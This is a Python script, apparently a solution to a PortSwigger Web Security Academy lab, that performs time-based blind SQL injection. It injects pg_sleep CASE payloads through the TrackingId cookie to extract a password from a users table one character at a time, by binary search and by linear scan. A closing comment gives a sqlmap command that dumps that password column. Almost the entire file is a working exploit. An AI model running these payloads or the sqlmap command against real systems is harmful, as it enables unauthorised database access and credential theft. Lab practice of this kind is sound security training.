import requests
import time
import string

url = "https://0aa6003604f772278039584c008f00af.web-security-academy.net/"

def sqli(pos, mid):

    #cookies = {
    #    "TrackingId": "' || (select case when (1=1) then pg_sleep(1) else pg_sleep(0) end) -- -"
    #}

    cookies = {
        "TrackingId": "' || (select case when ( ascii(substr((select password from users limit 1),%i,1)) > %i ) then pg_sleep(1) else pg_sleep(0) end) -- -" % (pos,mid)
    }

    #cookies = {
    #    "TrackingId": "' || (select case when ( ascii(substr((select 'HOLA'),2,1)) = 79 ) then pg_sleep(1) else pg_sleep(0) end) -- -"
    #}

    start_time = time.time()
    r = requests.get(url, cookies=cookies)
    total_time = time.time() - start_time
    
    return total_time >= 2.5

def sqli_1(pos, val):
    #cookies = {
    #    "TrackingId": "' || (select case when (1=1) then pg_sleep(1) else pg_sleep(0) end) -- -"
    #}

    cookies = {
        "TrackingId": "' || (select case when ( ascii(substr((select password from users limit 1),%i,1)) = %i ) then pg_sleep(1) else pg_sleep(0) end) -- -" % (pos, val)
    }

    #cookies = {
    #    "TrackingId": "' || (select case when ( ascii(substr((select 'HOLA'),2,1)) = 79 ) then pg_sleep(1) else pg_sleep(0) end) -- -"
    #}

    start_time = time.time()
    r = requests.get(url, cookies=cookies)
    total_time = time.time() - start_time
    #print(total_time)    
    return total_time >= 2.9


def get_char(pos):
    lo, hi = 32, 128
    while lo <= hi:
        mid = lo + (hi - lo) // 2
        if sqli(pos, mid):
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)

"""
flag = ''
for i in range(1, 30):
    flag += get_char(i)
    print(flag)
"""


for pos in range(1, 40):
#pos = 1
    for elem in string.printable:
    #for elem in "AHOLA":
        if sqli_1(pos, ord(elem)):
            print(elem, end="")
            break

print()

# Ojo si no da prueba con:
# sqlmap -u "https://0aa6003604f772278039584c008f00af.web-security-academy.net/" --cookie="TrackingId=YOUR_TRACKING_ID_VALUE" --dbms=PostgreSQL --technique=T --time-sec=10 --level=3 --risk=3 --dump -T users -C password --flush-session